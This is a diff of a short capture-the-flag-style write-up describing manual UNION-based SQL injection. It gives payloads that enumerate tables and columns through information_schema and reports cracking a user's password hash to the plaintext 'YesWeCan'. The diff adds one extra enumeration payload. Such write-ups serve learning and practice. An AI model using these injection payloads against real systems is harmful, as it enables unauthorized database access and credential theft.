@@ -16,8 +16,9 @@ Since we are not allowed to use automated tools like sqlmap.
 ```
  5 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
 ```
-3. With this command we get a list with all tables and columns searching for some words we found password and user columns on db_default .
+3. With this command we get a list with all schemas and tables and their columns searching for some words we found password and user columns on db_default .
 ```
+ 5 union select table_name, table_schema from information_schema.columns 
  5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns-- 
 ```
 4. Now we try to access users table to get users info and we get this : 2b3366bcfd44f540e630d4dc2b9b06d9 cracking it we get :	YesWeCan.
